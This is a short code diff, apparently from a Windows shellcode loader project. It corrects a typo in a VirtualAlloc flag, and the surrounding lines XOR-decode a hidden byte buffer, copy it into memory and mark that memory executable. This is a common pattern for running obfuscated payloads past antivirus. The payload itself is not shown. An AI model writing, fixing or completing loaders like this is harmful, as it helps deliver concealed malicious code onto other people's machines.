@@ -31,7 +31,7 @@ int main() {
     DWORD lpThreadId = 0;
     DWORD flOldProtect = 0;
     int bufsize = sizeof(buf);
-    LPVOID f = VirtualAlloc(NULL, bufsize, MEM_RESERVER|MEM_COMMIT, PAGE_READWRITE);
+    LPVOID f = VirtualAlloc(NULL, bufsize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
     for (int i = 0; i < (int)bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
     memcpy(f, buf, bufsize);
     VirtualProtect(f, bufsize, PAGE_EXECUTE_READ, &flOldProtect);
